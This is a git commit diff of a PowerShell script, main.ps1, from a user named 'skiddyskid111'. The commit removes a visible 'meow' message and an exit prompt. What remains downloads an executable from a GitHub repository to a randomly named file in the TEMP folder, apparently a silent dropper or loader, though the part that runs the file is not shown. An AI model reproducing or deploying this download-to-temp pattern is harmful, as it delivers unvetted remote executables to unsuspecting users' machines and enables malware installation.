a3af9e58778d45bc28f223cf52547f4574d7527d
skiddyskid111 <dhwhrvcxa@gmail.com>
2025-08-18 00:19:49 +0200

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,6 +1,3 @@
-Write-Output "meow"
-Read-Host "Press Enter to exit"
-
 $rand = Get-Random
 $path = "$env:TEMP\main_$rand.exe"
 Invoke-WebRequest -Uri "https://github.com/skiddyskid111/resources/raw/main/main.exe" -OutFile $path
